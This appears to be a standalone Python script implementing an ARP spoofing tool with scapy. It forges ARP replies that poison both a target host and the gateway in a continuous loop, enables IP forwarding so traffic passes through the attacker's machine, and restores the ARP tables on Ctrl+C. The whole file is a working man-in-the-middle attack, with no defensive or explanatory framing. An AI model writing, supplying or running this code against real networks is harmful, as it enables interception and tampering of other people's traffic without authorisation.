#!/usr/bin/env python

import scapy.all as scapy
import time
import subprocess


class ArpSpoof:
	
	def get_mac(self, ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcadt = broadcast / arp_request
		answered_list = scapy.srp(arp_request_broadcadt, timeout=1, verbose=False)[0]
		return answered_list[0][1].hwsrc


	def spoof(self, target_ip, spoof_ip):
		target_mac = self.get_mac(target_ip)
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	def restore(self, destination_ip, source_ip):
		dst_mac = self.get_mac(destination_ip)
		src_mac = self.get_mac(source_ip)
		packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dst_mac , psrc = source_ip, hwsrc = src_mac)
		scapy.send(packet, count = 4, verbose = False)


	def start(self, target_ip, gateway_ip):

		try:

			subprocess.call(r'echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
			
			
			sent_packets_count = 0
			while True:
				self.spoof(target_ip, gateway_ip)
				self.spoof(gateway_ip, target_ip)
				sent_packets_count += 2
				print("\r[+] Packets sent :" + str(sent_packets_count), end="")
				time.sleep(2)
		except KeyboardInterrupt:
			print("\n\n[+] Detected CTR + C ....... Quiting.")
			self.restore(target_ip, gateway_ip)
			self.restore(gateway_ip, target_ip)